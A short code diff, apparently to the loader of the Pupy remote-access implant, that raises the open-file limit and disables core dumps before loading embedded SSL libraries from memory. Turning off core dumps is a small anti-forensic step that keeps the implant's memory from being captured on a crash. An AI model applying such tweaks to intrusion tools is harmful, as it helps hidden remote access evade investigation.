@@ -12,6 +12,7 @@
 #include <pthread.h>
 #include <stdint.h>
 #include <sys/mman.h>
+#include <sys/resource.h>
 #include "pupy_load.h"
 #include "Python-dynload.h"
 
@@ -69,6 +70,14 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
 	uintptr_t cookie = 0;
 	PyGILState_STATE restore_state;
 
+	struct rlimit lim;
+	if (getrlimit(RLIMIT_NOFILE, &lim) == 0) {
+		lim.rlim_cur = lim.rlim_max;
+		setrlimit(RLIMIT_NOFILE, &lim);
+	}
+
+	lim.rlim_cur = 0; lim.rlim_max = 0;
+	setrlimit(RLIMIT_CORE, &lim);
 
 	xz_dynload("libcrypto.so.1.0.0", resources_libcrypto_so_start, resources_libcrypto_so_size);
 	xz_dynload("libssl.so.1.0.0", resources_libssl_so_start, resources_libssl_so_size);
